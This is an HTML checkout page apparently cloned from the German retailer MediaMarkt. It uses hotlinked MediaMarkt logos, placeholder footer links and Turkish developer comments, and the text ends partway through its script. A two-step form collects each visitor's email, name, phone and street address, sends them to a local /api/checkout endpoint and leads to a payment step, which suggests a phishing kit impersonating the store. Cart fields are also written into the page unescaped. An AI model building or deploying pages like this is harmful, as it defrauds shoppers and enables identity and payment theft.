<!doctype html>
<html lang="de-DE">
<head>
    <meta charset="UTF-8">
    <meta name="version" content="8.345.30">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="theme-color" content="#ffffff">
    <title>Warenkorb | MediaMarkt</title>
    <link rel="stylesheet" href="./css/styles.css">
    <style>
        body {
            padding-bottom: 120px; /* Sticky footer i√ßin alan */
        }
        .checkout-container {
            max-width: 1200px;
            margin: 40px auto;
            padding: 0 20px;
        }
        .checkout-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        .checkout-title {
            font-size: 2rem;
            font-weight: 700;
            color: #000;
            margin: 0;
        }
        .checkout-clear-button {
            padding: 10px 20px;
            background: #fff;
            color: #666;
            border: 1px solid #e3e3e3;
            border-radius: 6px;
            font-size: 0.9rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
        .checkout-clear-button:hover {
            background: #f5f5f5;
            border-color: #ccc;
            color: #000;
        }
        .checkout-items-section {
            margin-bottom: 40px;
        }
        .checkout-items-section-title {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 20px;
            color: #000;
        }
        .checkout-items {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        .checkout-item {
            display: flex;
            gap: 20px;
            padding: 20px;
            border: 1px solid #e3e3e3;
            border-radius: 8px;
            background: #fff;
        }
        .checkout-item-image {
            width: 120px;
            height: 120px;
            object-fit: contain;
            border-radius: 6px;
            background: #f5f5f5;
        }
        .checkout-item-details {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .checkout-item-name {
            font-size: 1.1rem;
            font-weight: 600;
            color: #000;
        }
        .checkout-item-specs {
            font-size: 0.9rem;
            color: #666;
        }
        .checkout-item-price {
            font-size: 1.2rem;
            font-weight: 700;
            color: #000;
            margin-top: auto;
        }
        .checkout-empty {
            text-align: center;
            padding: 60px 20px;
            color: #666;
        }
        .checkout-empty h2 {
            font-size: 1.5rem;
            margin-bottom: 10px;
        }
        .checkout-summary {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #fff;
            border-top: 2px solid #e3e3e3;
            padding: 20px;
            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
            z-index: 1000;
        }
        .checkout-summary-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 20px;
        }
        .checkout-total {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 1.5rem;
            font-weight: 700;
        }
        .checkout-button {
            padding: 16px 32px;
            background: #DF0000;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            white-space: nowrap;
        }
        .checkout-button:hover {
            background: #b80000;
        }
        .checkout-button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        @media (max-width: 768px) {
            .checkout-summary-content {
                flex-direction: column;
                align-items: stretch;
            }
            .checkout-total {
                justify-content: space-between;
            }
            .checkout-button {
                width: 100%;
            }
        }
        
        /* Checkout Form Modal */
        #checkout-form-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 10000;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        #checkout-form-modal.show {
            display: flex;
        }
        
        .checkout-form-container {
            background: #fff;
            border-radius: 8px;
            max-width: 600px;
            width: 100%;
            max-height: 90vh;
            overflow-y: auto;
            padding: 30px;
            position: relative;
        }
        
        .checkout-form-close {
            position: absolute;
            top: 15px;
            right: 15px;
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #666;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .checkout-form-close:hover {
            color: #000;
        }
        
        .checkout-form-title {
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 20px;
            color: #000;
        }
        
        .checkout-form-step {
            display: none;
        }
        
        .checkout-form-step.active {
            display: block;
        }
        
        .checkout-form-group {
            margin-bottom: 20px;
        }
        
        .checkout-form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #000;
            font-size: 0.9rem;
        }
        
        .checkout-form-input {
            width: 100%;
            padding: 12px;
            border: 1px solid #e3e3e3;
            border-radius: 6px;
            font-size: 1rem;
            box-sizing: border-box;
        }
        
        .checkout-form-input:focus {
            outline: none;
            border-color: #DF0000;
        }
        
        .checkout-form-buttons {
            display: flex;
            gap: 10px;
            margin-top: 30px;
            justify-content: flex-end;
        }
        
        .checkout-form-button {
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .checkout-form-button-primary {
            background: #DF0000;
            color: #fff;
        }
        
        .checkout-form-button-primary:hover {
            background: #b80000;
        }
        
        .checkout-form-button-secondary {
            background: #f5f5f5;
            color: #000;
        }
        
        .checkout-form-button-secondary:hover {
            background: #e3e3e3;
        }
        
        .checkout-form-step-indicator {
            display: flex;
            gap: 10px;
            margin-bottom: 30px;
            justify-content: center;
        }
        
        .checkout-form-step-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #e3e3e3;
            transition: background 0.2s;
        }
        
        .checkout-form-step-dot.active {
            background: #DF0000;
        }
    </style>
</head>
<body>
    <!-- Header from index.html -->
    <header class="sc-1d3f392e-5 kmzwkf"><div class="sc-78b2b74c-3 fOUbBp"><div class="sc-f4faa446-0 jKRVjj"><div display="flex" class="sc-637a2157-0 glxvvw sc-119d269d-0 krMhpp"><div order="[object Object]" class="sc-637a2157-1 ivTaLS sc-119d269d-2 gkVaBF"><div class="sc-6df1bcc5-0 pLiQw"><button type="button" aria-disabled="false" class="sc-836914d0-1 kHrZuV sc-6df1bcc5-1 kzkZwV categories-button" translate="no" id="mms-app-header-category-button" data-ignore-a11y="true" aria-label="Alle Kategorien" aria-haspopup="true" aria-expanded="true"><div width="[object Object]" height="[object Object]" aria-hidden="true" class="sc-a4db4a77-0 vVOBv"><svg viewBox="0 0 80 80" role="presentation" focusable="false"><path d="M4.726 9.507c-2.66 0-4.56 2.279-4.56 4.938s2.28 4.56 4.94 4.56h70.283c2.66 0 4.56-1.9 4.56-4.56s-1.9-4.938-4.56-4.938zm0 25.834c-2.66 0-4.56 1.9-4.56 4.559s2.28 4.559 4.94 4.559h70.283c2.66 0 4.56-1.9 4.56-4.56s-1.9-4.558-4.56-4.558zm0 25.454c-2.66 0-4.94 2.28-4.94 4.939s2.28 4.559 4.94 4.559H75.01c2.659 0 4.938-2.28 4.938-4.94s-2.28-4.938-4.938-4.938H4.726z"></path></svg></div><span class="sc-94eb08bc-0 iPIoLC"><div to="lgScreen" class="sc-6187fc2b-0 hWHqUb">Alle Kategorien</div></span><span class="sc-f5b2dacb-0 hBMxtr"></span></button></div></div><a class="sc-66506eb5-0 fFkljT sc-119d269d-3 jSRSws" data-test="mms-anchor-link" target="_self" href="/" aria-label="MediaMarkt"><svg viewBox="0 0 50 50" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-36cce418-0 toiHs"><path d="M5.111 46.426 3.683 48.08H48.08V1.92H43.561l-.3.346-38.15 44.16Z" fill="#000" stroke="#fff" stroke-width="2"></path><path d="M2.92 1.92h-1v46.16h4.406l.299-.346 38.15-44.16 1.429-1.654H2.92Z" fill="#DF0000" stroke="#fff" stroke-width="2"></path><path d="M39.664 34.177c.002.009.014.143.017.238.004.066 0 .169 0 .173l.018.015c.83.682 1.712 1.61 1.865 2.292a.74.74 0 0 1-.042.506c-.089.17-.254.292-.486.371-1.19.407-4.03-.373-6.347-1.518-1.655-.818-3.109-1.793-4.092-2.747-.914-.885-1.16-1.578-.925-1.994.09-.158.245-.274.452-.354.756-.295 2.205-.09 3.631.336-.676.505-1.146 1.184-1.362 1.865l-.002.004v.003c-.067.623.834 1.438 1.746 1.891 0-.003.05.02.05.016l-.01-.066c-.213-1.547.959-3.864 2.19-4.372.08-.032.148-.051.159-.055a21.23 21.23 0 0 0-.45-.03 3.75 3.75 0 0 0-1.98.519c-2.38-.817-4.123-.913-4.85-.67-.29.097-.486.245-.582.438-.101.203-.101.459 0 .76.331.99 1.779 2.346 3.614 3.549.266 1.4 1.522 2.838 3.318 3.028l.083.009c-.002-.002.03 0 .028 0l-.1-.077c-.555-.428-1.055-1.134-1.226-1.746l.191.096c2.902 1.434 5.944 2.165 7.292 1.715.303-.101.524-.244.626-.447.097-.196.08-.453-.017-.743-.253-.758-1.34-1.912-2.72-2.941a1.135 1.135 0 0 1-.089-.064Z" fill="#F07D00"></path><path d="M18.22 10.417c.679.308 1.295.732 1.822 1.246-2.188-.092-4.111.759-5.118 2.061-.453.586-.753 1.368-.558 2.107a2 2 0 0 0 .493.875c-.848-.512-.952-1.635-.698-2.54.51-1.847 2.12-3.171 4.059-3.75Zm-4.927 6.862c.849.408 1.973.5 2.623-.247a2.01 2.01 0 0 1-.947.334c-.762.063-1.48-.368-1.978-.916-1.107-1.218-1.612-3.261-1.14-5.4a6.332 6.332 0 0 0-1.546 1.58c.234 2.01 1.259 3.823 2.988 4.649Zm1.203 1.227c.912-.233 1.832-.884 1.852-1.875-.04.135-.16.518-.51.863-.545.537-1.37.67-2.105.57-1.631-.22-3.332-1.462-4.345-3.405a6.435 6.435 0 0 0-.166 2.206c1.47 1.39 3.42 2.12 5.274 1.64Zm1.042-3.129c.136-.034.53-.12 1.004.01.737.202 1.264.852 1.546 1.537.624 1.523.4 3.616-.776 5.463a6.351 6.351 0 0 0 1.992-.956c.47-1.968.127-4.023-1.216-5.39-.658-.671-1.683-1.142-2.55-.664Zm.67 3.295c.548-.764.835-1.855.213-2.626.056.13.21.5.164.99-.072.76-.62 1.393-1.246 1.789-1.393.88-3.492 1.022-5.518.184a6.364 6.364 0 0 0 1.291 1.797c2.02.12 3.983-.574 5.095-2.134Zm-.88-1.61a1.998 1.998 0 0 1-.94-.352c-.623-.443-.896-1.234-.926-1.974-.066-1.644.86-3.534 2.597-4.87a6.428 6.428 0 0 0-2.2.219c-1.112 1.688-1.493 3.735-.699 5.479.386.858 1.189 1.651 2.168 1.498Zm2.048-2.584c-.936-.093-2.024.204-2.381 1.13.084-.115.328-.434.775-.639.695-.318 1.516-.16 2.173.185 1.457.766 2.63 2.512 2.918 4.683a6.357 6.357 0 0 0 .91-2.012c-.904-1.808-2.487-3.163-4.395-3.347Zm-1.552-.742c-.778.53-1.419 1.458-1.099 2.396-.01-.14-.026-.543.185-.986.327-.692 1.058-1.098 1.783-1.255 1.608-.35 3.628.234 5.245 1.711a6.388 6.388 0 0 0-.594-2.126c-1.857-.805-3.94-.825-5.52.26Zm1.802 3.963c-.07-.938-.552-1.958-1.525-2.148.127.062.483.248.762.653.435.629.42 1.465.195 2.171-.5 1.569-2.018 3.027-4.107 3.688.686.31 1.412.491 2.143.546 1.624-1.205 2.682-3 2.532-4.91Z" fill="#fff"></path></svg><img data-test="styled-logo" src="https://cms-images.mmst.eu/2rj3gcd43pmw/2xslVTe29DChwWBl7wq8if/6971ffc3da3db06f5758f71fcc563a7e/MMS_Logo_outline.svg?q=80" alt="MMSE Logo" width="288" height="58" class="sc-7d7e1b05-0 eorpwV"/></a><div from="mdScreen" class="sc-6187fc2b-0 kwufFZ"><div order="0" class="sc-637a2157-1 ljtozd"></div></div><div order="[object Object]" class="sc-637a2157-1 itGMTa sc-119d269d-1 hkeVPz"><div data-test="mms-searchbox" class="sc-f8e43919-0 fEzTMS"><form aria-labelledby="" data-test="search-form" id="storybook-form-1" role="search"><button type="submit" data-test="submitBtn" hidden=""></button><div display="inline-flex" class="sc-637a2157-0 kvkKOX sc-7af5671c-0 bYrcrA sc-5953a6a7-0 hisqrm"><div class="sc-d9ebd515-0 cEMHWp"><label data-ignore-a11y="true" for="search-form" id="search-form-label" class="sc-94eb08bc-0 buosvH sc-d9ebd515-1 dfbAmv">Was suchst Du?</label><div class="sc-3bf4c565-0 gTGOob"><button type="button" aria-disabled="false" class="sc-836914d0-1 dPrCUH sc-7ea96dce-0 hfkcAM sc-3bf4c565-1 bDciuX" translate="no" data-ignore-a11y="true" aria-label="Suchen"><span height="24" width="48" color="#000000" aria-hidden="true" class="sc-a4db4a77-0 sc-3bf4c565-2 jWFwbD hPbjhf"><svg width="24" height="24" fill="none" viewBox="0 0 24 24" role="presentation" focusable="false"><path fill="#3A3A3A" fill-rule="evenodd" d="M7.939 3.609a8 8 0 0 1 9.38 12.296l4.388 4.388a1 1 0 0 1-1.414 1.414l-4.388-4.387A8 8 0 1 1 7.94 3.609M11 5a6 6 0 1 0 0 12 6 6 0 0 0 0-12" class="base" clip-rule="evenodd"></path></svg></span><span class="sc-f5b2dacb-0 hBMxtr"></span></button></div><input id="search-form" role="combobox" aria-haspopup="listbox" aria-autocomplete="list" aria-controls="search-popup" aria-expanded="false" aria-activedescendant="" type="search" aria-invalid="false" aria-required="false" aria-disabled="false" autoComplete="off" class="sc-7af5671c-1 boqXeD" value=""/></div></div></form></div></div><div order="2" class="sc-637a2157-1 bPTkWk"><div to="lgScreen" class="sc-6187fc2b-0 hWHqUb"><div class="sc-1d3f392e-2 gfnmqq" data-test="mms-marketselector-container"><button type="button" aria-disabled="false" class="sc-836914d0-1 lnzBCP" translate="no" data-ignore-a11y="true"><div display="flex" class="sc-637a2157-0 iHzpMy"><div order="0" class="sc-637a2157-1 hsEMlm sc-e4648bb2-0 jbesgJ"><p data-test="mms-dropdown-styled-label" class="sc-94eb08bc-0 hebqLA">Mein Markt</p><p data-test="mms-dropdown-additional-label" class="sc-94eb08bc-0 eYVhwn">Kein Markt ausgew√§hlt</p></div><div order="0" class="sc-637a2157-1 hsEMlm"><div width="16" height="16" color="#ffffff" rotate="90" aria-hidden="true" class="sc-a4db4a77-0 bixKOX"><svg width="32" height="32" viewBox="0 0 24 24"><path d="M15.78 11.28a.75.75 0 0 1 .22.53v.38a.77.77 0 0 1-.22.53l-5.14 5.13a.5.5 0 0 1-.71 0l-.71-.71a.49.49 0 0 1 0-.7L13.67 12 9.22 7.56a.5.5 0 0 1 0-.71l.71-.7a.5.5 0 0 1 .71 0Z"></path></svg></div></div></div></button></div></div></div><div class="sc-119d269d-4 kMAySK"><div order="0" class="sc-637a2157-1 larYeC"><div to="lgScreen" class="sc-6187fc2b-0 hWHqUb"></div></div><div order="0" class="sc-637a2157-1 hsEMlm"><button type="button" aria-disabled="false" class="sc-836914d0-1 cAkjHC" translate="no" data-test="myaccount-dropdown-button" data-ignore-a11y="true" aria-label="Mein Konto" data-loggedin="false"><div height="[object Object]" width="[object Object]" aria-hidden="true" class="sc-a4db4a77-0 hrzHkW"><svg width="32" height="32" viewBox="0 0 24 24"><path d="M12 12a4 4 0 1 0-4-4 4 4 0 0 0 4 4m0-6a2 2 0 1 1-2 2 2 2 0 0 1 2-2m7.89 12.55L18 14.66A3 3 0 0 0 15.26 13H8.74a3 3 0 0 0-2.69 1.66l-1.94 3.89A1 1 0 0 0 5 20h14a1 1 0 0 0 .89-1.45M6.62 18l1.22-2.45a1 1 0 0 1 .9-.55h6.52a1 1 0 0 1 .9.55L17.38 18Z"></path></svg></div><span class="sc-f5b2dacb-0 hBMxtr"></span></button></div><div class="sc-eb73042b-0 cjsGnv"><a class="sc-836914d0-0 jtsFEz" aria-disabled="false" href="/de/myaccount/wishlist" data-ignore-a11y="true" aria-label="Preisalarm stellen"><div height="[object Object]" width="[object Object]" aria-hidden="true" class="sc-a4db4a77-0 hrzHkW"><svg width="32" height="32" viewBox="0 0 24 24"><path d="M16.5 3A6.36 6.36 0 0 0 12 5.07 6.36 6.36 0 0 0 7.5 3 5.5 5.5 0 0 0 2 8.5c0 3.92 4.75 8.25 7 10.5l2.28 2.28a.75.75 0 0 0 .53.22h.38a.75.75 0 0 0 .53-.22L15 19c2.25-2.25 7-6.58 7-10.5A5.5 5.5 0 0 0 16.5 3m-2.3 14L12 19.17 9.8 17C7.77 15 4 11.26 4 8.5A3.5 3.5 0 0 1 7.5 5a5 5 0 0 1 3.71 2.21.77.77 0 0 0 .6.29h.45a.51.51 0 0 0 .4-.2A5.11 5.11 0 0 1 16.47 5 3.5 3.5 0 0 1 20 8.5c0 2.76-3.77 6.5-5.8 8.5"></path></svg></div><span class="sc-f5b2dacb-0 hBMxtr"></span></a></div><div class="sc-8250986c-0 hdhenz"><a class="sc-836914d0-0 jtsFEz" aria-disabled="false" href="/checkout.html" data-ignore-a11y="true" aria-label="Warenkorb"><div height="[object Object]" width="[object Object]" aria-hidden="true" class="sc-a4db4a77-0 hrzHkW"><svg width="32" height="32" viewBox="0 0 24 24"><path d="M21.5 4H5.72l-.56-1a2 2 0 0 0-1.74-1H2.5a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h.92l4.28 7.49a2.2 2.2 0 0 0 .27.35l-1.86 3.7a.77.77 0 0 0 0 .71l.22.38A.76.76 0 0 0 7 17h12.5a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5H8.62l1-2.09a2.74 2.74 0 0 0 .64.09h6.23A2.94 2.94 0 0 0 19 11.49l2.35-4.13A4.76 4.76 0 0 0 22 5v-.5a.5.5 0 0 0-.5-.5m-4.22 6.5a1 1 0 0 1-.75.5H10.3a1 1 0 0 1-.86-.5L6.87 6h12.92c-.05.12-.09.25-.15.37ZM18 18a2 2 0 1 0 2 2 2 2 0 0 0-2-2M8 18a2 2 0 1 0 2 2 2 2 0 0 0-2-2"></path></svg></div><span class="sc-f5b2dacb-0 hBMxtr"></span></a></div></div></div></header>

    <!-- Checkout Content -->
    <div class="checkout-container">
        <div class="checkout-header">
            <h1 class="checkout-title">Warenkorb</h1>
            <button id="checkout-clear-button" class="checkout-clear-button" style="display: none;">Warenkorb leeren</button>
        </div>
        
        <div class="checkout-items-section">
            <h2 class="checkout-items-section-title">Warenkorb</h2>
            <div id="checkout-items" class="checkout-items">
                <!-- Items will be loaded here -->
            </div>
        </div>
        
        <div id="checkout-empty" class="checkout-empty" style="display: none;">
            <h2>Ihr Warenkorb ist leer</h2>
            <p>F√ºgen Sie Artikel hinzu, um fortzufahren.</p>
        </div>
        
        <div id="checkout-summary" class="checkout-summary" style="display: none;">
        <div class="checkout-summary-content">
                <div class="checkout-total">
                    <span>Gesamtsumme:</span>
                    <span id="checkout-total-price">0,00 ‚Ç¨</span>
                </div>
            <button id="checkout-complete-button" class="checkout-button" data-track-activity="post" data-button-name="checkout-open-form">Bestellung abschlie√üen</button>
            </div>
        </div>
    </div>
    
    <!-- Checkout Form Modal -->
    <div id="checkout-form-modal">
    <div class="checkout-form-container" data-activity-scope="checkout-form">
            <button class="checkout-form-close" onclick="closeCheckoutForm()">&times;</button>
            <h2 class="checkout-form-title">Bestelldaten</h2>
            
            <div class="checkout-form-step-indicator">
                <div class="checkout-form-step-dot active" id="step-indicator-1"></div>
                <div class="checkout-form-step-dot" id="step-indicator-2"></div>
            </div>
            
            <!-- Step 1: E-posta, Ad, Soyad -->
            <div class="checkout-form-step active" id="checkout-step-1">
                <div class="checkout-form-group">
                    <label class="checkout-form-label" for="checkout-email">E-Mail-Adresse *</label>
                    <input type="email" id="checkout-email" class="checkout-form-input" required>
                </div>
                <div class="checkout-form-group">
                    <label class="checkout-form-label" for="checkout-firstname">Vorname *</label>
                    <input type="text" id="checkout-firstname" class="checkout-form-input" required>
                </div>
                <div class="checkout-form-group">
                    <label class="checkout-form-label" for="checkout-lastname">Nachname *</label>
                    <input type="text" id="checkout-lastname" class="checkout-form-input" required>
                </div>
                <div class="checkout-form-buttons">
                    <button type="button" class="checkout-form-button checkout-form-button-secondary" onclick="closeCheckoutForm()" data-track-activity="post" data-button-name="checkout-cancel-step-1">Abbrechen</button>
                    <button type="button" class="checkout-form-button checkout-form-button-primary" onclick="nextStep()" data-track-activity="post" data-button-name="checkout-step-1-next">Weiter</button>
                </div>
            </div>
            
            <!-- Step 2: Telefon, Adres -->
            <div class="checkout-form-step" id="checkout-step-2">
                <div class="checkout-form-group">
                    <label class="checkout-form-label" for="checkout-phone">Telefonnummer *</label>
                    <input type="tel" id="checkout-phone" class="checkout-form-input" required>
                </div>
                <div class="checkout-form-group">
                    <label class="checkout-form-label" for="checkout-street">Stra√üe *</label>
                    <input type="text" id="checkout-street" class="checkout-form-input" required>
                </div>
                <div class="checkout-form-group">
                    <label class="checkout-form-label" for="checkout-housenumber">Hausnummer *</label>
                    <input type="text" id="checkout-housenumber" class="checkout-form-input" required>
                </div>
                <div class="checkout-form-group">
                    <label class="checkout-form-label" for="checkout-postal">Postleitzahl *</label>
                    <input type="text" id="checkout-postal" class="checkout-form-input" required>
                </div>
                <div class="checkout-form-group">
                    <label class="checkout-form-label" for="checkout-city">Stadt *</label>
                    <input type="text" id="checkout-city" class="checkout-form-input" required>
                </div>
                <div class="checkout-form-group">
                    <label class="checkout-form-label" for="checkout-country">Land *</label>
                    <input type="text" id="checkout-country" class="checkout-form-input" value="Deutschland" required>
                </div>
                <div class="checkout-form-buttons">
                    <button type="button" class="checkout-form-button checkout-form-button-secondary" onclick="prevStep()" data-track-activity="post" data-button-name="checkout-step-2-back">Zur√ºck</button>
                    <button type="button" class="checkout-form-button checkout-form-button-primary" onclick="goToPayment()" data-track-activity="post" data-button-name="checkout-go-payment">Zum Zahlungsschritt</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer from index.html -->
    <footer><div class="sc-738c25a2-1 jwCJge"><div class="sc-f4faa446-0 jKRVjj"><div class="sc-d11e3971-0 dmkded sc-738c25a2-2 dAjZLE"><div class="sc-4a318613-0 iWijAx"><div class="sc-d11e3971-0 dmkded"><div class="sc-4a318613-0 hNdmpF"><h3 class="sc-94eb08bc-0 ijnUQY">Kontakt</h3><span class="sc-3fc1aa33-0 UIXmq"></span><div display="flex" class="sc-637a2157-0 iDWlkH"><div order="0" class="sc-637a2157-1 hsEMlm sc-5dcfb0f4-0 itMyko"><img src="https://cms-images.mmst.eu/2rj3gcd43pmw/3KYTXlFwY99fqfESVE5OHZ/c78a459e980b6b43118eeb26dd31ebc2/StyleGuideChat.svg?q=80" alt="" width="32" height="32" class="sc-5dcfb0f4-2 jCJRgA"/><span direction="horizontal" class="sc-3fc1aa33-0 htkAlu"></span><div><p class="sc-94eb08bc-0 dZfHSc">Fragen und Antworten</p><a class="sc-66506eb5-0 cwhatz sc-5dcfb0f4-1 jClVCS" data-test="mms-anchor-link" target="_self" href="#" aria-label="findest du hier"><span class="sc-94eb08bc-0 hneICH sc-a0079270-0 eckZqU">findest du hier</span></a></div></div><div order="0" class="sc-637a2157-1 hsEMlm sc-5dcfb0f4-0 itMyko"><img src="https://cms-images.mmst.eu/2rj3gcd43pmw/19uWgfVluP2QFnaf4hNkDk/f13ff029300ca51f22377e223584f3e9/StyleGuideContact.svg?q=80" alt="" width="32" height="32" class="sc-5dcfb0f4-2 jCJRgA"/><span direction="horizontal" class="sc-3fc1aa33-0 htkAlu"></span><div><p class="sc-94eb08bc-0 dZfHSc">Schreib uns</p><a class="sc-66506eb5-0 cwhatz sc-5dcfb0f4-1 jClVCS" data-test="mms-anchor-link" target="_self" href="#" aria-label="Kontaktformular"><span class="sc-94eb08bc-0 hneICH sc-a0079270-0 eckZqU">Kontaktformular</span></a></div></div></div></div><div class="sc-4a318613-0 ctUkyN"><div display="flex" class="sc-637a2157-0 jmVPrJ"><div order="0" class="sc-637a2157-1 hsEMlm"><span direction="vertical" class="sc-3fc1aa33-0 HKCxQ"></span><a class="sc-66506eb5-0 cwhatz" data-test="mms-anchor-link" rel="noopener noreferrer" target="_blank" href="#" aria-label="Facebook"><img src="https://cms-images.mmst.eu/2rj3gcd43pmw/4YxPM5sJJsdTaDQi48GoQV/eb672edddb74e789a777ab6b6dd53597/facebook.svg?q=80" alt="" width="24" height="24"/><span direction="horizontal" class="sc-3fc1aa33-0 gNtsCG"></span></a><a class="sc-66506eb5-0 cwhatz" data-test="mms-anchor-link" rel="noopener noreferrer" target="_blank" href="#" aria-label="YouTube"><img src="https://cms-images.mmst.eu/2rj3gcd43pmw/E85mT16flTfoqoNVnvkeD/79689bc1f67e7316529a1568b578a039/youtube.svg?q=80" alt="" width="24" height="24"/><span direction="horizontal" class="sc-3fc1aa33-0 gNtsCG"></span></a><a class="sc-66506eb5-0 cwhatz" data-test="mms-anchor-link" rel="noopener noreferrer" target="_blank" href="#" aria-label="Instagram"><img src="https://cms-images.mmst.eu/2rj3gcd43pmw/25IEoiozUxzYwksTz6OhgL/92a5f11fe3d96a169144590c14ae53b2/instagram.svg?q=80" alt="" width="24" height="24"/><span direction="horizontal" class="sc-3fc1aa33-0 gNtsCG"></span></a></div></div></div></div></div></div></footer>

    <script>
        // Load cart items - √ßoklu √ßaƒürƒ± korumasƒ±
        var isLoadingCart = false;
        var currentCartTotal = 0;

        function saveCheckoutData(data) {
            console.log('üì§ Checkout verisi g√∂nderiliyor:', data);
            fetch('/api/checkout', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(function(res) {
                console.log('üì• Response status:', res.status);
                return res.json().then(function(result) {
                    console.log('üì• Response data:', result);
                    if (res.ok) {
                        console.log('‚úÖ Checkout verisi kaydedildi');
                    } else {
                        console.error('‚ùå Checkout verisi kaydedilemedi - Status:', res.status, result);
                    }
                });
            }).catch(function(err) {
                console.error('‚ùå Checkout verisi kaydedilemedi:', err);
            });
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            loadCartItems();
        });

        function loadCartItems() {
            // √áoklu √ßaƒürƒ± korumasƒ±
            if (isLoadingCart) {
                console.log('‚ö†Ô∏è Sepet y√ºkleme i≈ülemi devam ediyor');
                return;
            }
            
            isLoadingCart = true;
            fetch('/api/cart')
                .then(function(res) {
                    if (!res.ok) throw new Error('Network error');
                    return res.json();
                })
                .then(function(data) {
                    var items = data.items || [];
                    var itemsContainer = document.getElementById('checkout-items');
                    var emptyContainer = document.getElementById('checkout-empty');
                    var summaryContainer = document.getElementById('checkout-summary');
                    var clearButton = document.getElementById('checkout-clear-button');
                    
                    if (items.length === 0) {
                        itemsContainer.style.display = 'none';
                        emptyContainer.style.display = 'block';
                        summaryContainer.style.display = 'none';
                        if (clearButton) clearButton.style.display = 'none';
                        return;
                    }
                    
                    itemsContainer.style.display = 'flex';
                    emptyContainer.style.display = 'none';
                    summaryContainer.style.display = 'block';
                    if (clearButton) clearButton.style.display = 'block';
                    
                    // Duplicate kontrol√º (ek g√ºvenlik) - render'dan √∂nce
                    var uniqueItems = [];
                    var seenSlugs = new Set();
                    items.forEach(function(item) {
                        if (item && item.slug && !seenSlugs.has(item.slug)) {
                            seenSlugs.add(item.slug);
                            uniqueItems.push(item);
                        }
                    });
                    
                    // Eƒüer duplicate varsa, unique items'ƒ± kullan
                    if (uniqueItems.length !== items.length) {
                        console.log('‚ö†Ô∏è Duplicate items bulundu, temizleniyor:', items.length, '->', uniqueItems.length);
                        items = uniqueItems;
                    }
                    
                    // Render items
                    itemsContainer.innerHTML = items.map(function(item) {
                        var specs = [];
                        if (item.storage) specs.push('Speicher: ' + item.storage);
                        if (item.color) specs.push('Farbe: ' + item.color);
                        
                        return '<div class="checkout-item">' +
                            '<img src="' + (item.imageUrl || '') + '" alt="' + (item.name || '') + '" class="checkout-item-image" onerror="this.src=\'https://assets.mmsrg.com/isr/166325/c1/-/ASSET_MMS_161554000/fee_786_587_png\'">' +
                            '<div class="checkout-item-details">' +
                            '<div class="checkout-item-name">' + (item.name || 'Unbekanntes Produkt') + '</div>' +
                            (specs.length > 0 ? '<div class="checkout-item-specs">' + specs.join(' ‚Ä¢ ') + '</div>' : '') +
                            '<div class="checkout-item-price">' + (item.price ? item.price.toFixed(2) + ' ‚Ç¨' : '0,00 ‚Ç¨') + '</div>' +
                            '</div>' +
                            '</div>';
                    }).join('');
                    
                    // Calculate total
                    var total = items.reduce(function(sum, item) {
                        return sum + (item.price || 0);
                    }, 0);
                    
                    document.getElementById('checkout-total-price').textContent = total.toFixed(2) + ' ‚Ç¨';
                    currentCartTotal = total;
                    try {
                        sessionStorage.setItem('checkoutTotal', total);
                    } catch (e) {}
                    
                    isLoadingCart = false;
                })
                .catch(function(error) {
                    console.error('‚ùå Sepet y√ºklenemedi:', error);
                    document.getElementById('checkout-empty').style.display = 'block';
                    document.getElementById('checkout-items').style.display = 'none';
                    document.getElementById('checkout-summary').style.display = 'none';
                    isLoadingCart = false;
                });
        }
        
        // Clear cart button
        document.getElementById('checkout-clear-button').addEventListener('click', function() {
            if (confirm('M√∂chten Sie den Warenkorb wirklich leeren?')) {
                clearCart();
            }
        });
        
        // Clear cart function
        function clearCart() {
            fetch('/api/cart', {
                method: 'DELETE'
            })
                .then(function(res) {
                    if (!res.ok) throw new Error('Network error');
                    return res.json();
                })
                .then(function(data) {
                    console.log('‚úÖ Warenkorb geleert:', data);
                    // Sepeti yeniden y√ºkle
                    loadCartItems();
                })
                .catch(function(error) {
                    console.error('‚ùå Warenkorb konnte nicht geleert werden:', error);
                    alert('Fehler beim Leeren des Warenkorbs');
                });
        }
        
        // Checkout form functions
        var currentStep = 1;
        
        function showCheckoutForm() {
            document.getElementById('checkout-form-modal').classList.add('show');
            currentStep = 1;
            updateStepIndicator();
        }
        
        function closeCheckoutForm() {
            document.getElementById('checkout-form-modal').classList.remove('show');
            currentStep = 1;
            updateStepIndicator();
        }
        
        function nextStep() {
            // Validate step 1
            var email = document.getElementById('checkout-email').value;
            var firstname = document.getElementById('checkout-firstname').value;
            var lastname = document.getElementById('checkout-lastname').value;
